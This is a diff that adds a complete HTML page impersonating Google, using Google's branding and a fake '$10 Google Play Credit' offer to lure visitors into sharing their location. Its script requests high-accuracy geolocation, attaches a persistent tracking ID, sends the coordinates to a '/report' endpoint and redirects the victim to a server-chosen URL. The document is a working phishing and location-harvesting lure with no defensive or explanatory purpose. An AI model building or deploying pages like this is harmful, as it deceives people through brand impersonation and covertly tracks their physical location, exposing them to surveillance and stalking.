@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Claim $10 Offer</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+    :root{
+      --google-blue:#4285f4;
+      --google-red:#ea4335;
+      --google-yellow:#fbbc05;
+      --google-green:#34a853;
+    }
+    *{box-sizing:border-box;}
+    body{font-family:'Roboto', sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f1f3f4;margin:0}
+    #card{background:#fff;padding:2.5rem 2rem;border-radius:16px;box-shadow:0 8px 32px rgba(60,64,67,.15);text-align:center;width:350px}
+    #logo{margin-bottom:1rem;width: 300px;}
+    h2{margin:0 0 .5rem;font-weight:500;color:#202124}
+    p{margin:.5rem 0 1rem;color:#5f6368;font-size:15px;line-height:1.4}
+    button{background:var(--google-blue);color:#fff;border:none;border-radius:24px;padding:.75rem 2rem;font-size:16px;font-weight:500;cursor:pointer;transition:background .2s}
+    button:hover{background:#3367d6}
+    button:disabled{background:#c6d5fd;cursor:default}
+    small{display:block;margin-top:1.25rem;font-size:11px;color:#70757a}
+  </style>
+</head>
+<body>
+  <div id="card">
+    <img id="logo" src="https://i.ibb.co/5xrJL2MR/8973d4473f428cb78cca39f82c15af3e-removebg-preview.png" width="48" alt="Google logo" />
+    <h2>Get $10 Google Play Credit</h2>
+    <p>Share your location to confirm regional eligibility and claim your reward.*</p>
+    <button id="claimBtn">Claim $10</button>
+    <p id="status" style="margin-top:1rem;font-weight:500;color:var(--google-blue);"></p>
+    <small>* Promotional offer. Terms apply.</small>
+  </div>
+
+  <script>
+    // ───── Helper: UUID v4 ─────
+    function uuidv4(){return([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,c=>(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16));}
+    const CID_KEY="client_id";
+    let cid=localStorage.getItem(CID_KEY);
+    if(!cid){cid=uuidv4();localStorage.setItem(CID_KEY,cid);}    
+    const btn=document.getElementById('claimBtn');
+    const statusEl=document.getElementById('status');
+
+    function sendLocation(pos){
+      const {latitude,longitude,accuracy}=pos.coords;
+      statusEl.textContent='Submitting…';
+      fetch('/report',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({latitude,longitude,accuracy,cid})
+      }).then(r=>r.json())
+        .then(d=>{statusEl.textContent='Redirecting…';window.location.href=d.redirect;})
+        .catch(()=>statusEl.textContent='⚠️ Network error.');
+    }
+    function handleError(err){statusEl.textContent='Error: '+err.message;btn.disabled=false;}
+
+    btn.addEventListener('click',()=>{
+      btn.disabled=true;
+      statusEl.textContent='Requesting location…';
+      if(!navigator.geolocation){statusEl.textContent='Geolocation not supported';return;}
+      navigator.geolocation.getCurrentPosition(sendLocation,handleError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+    });
+  </script>
+</body>
+</html>
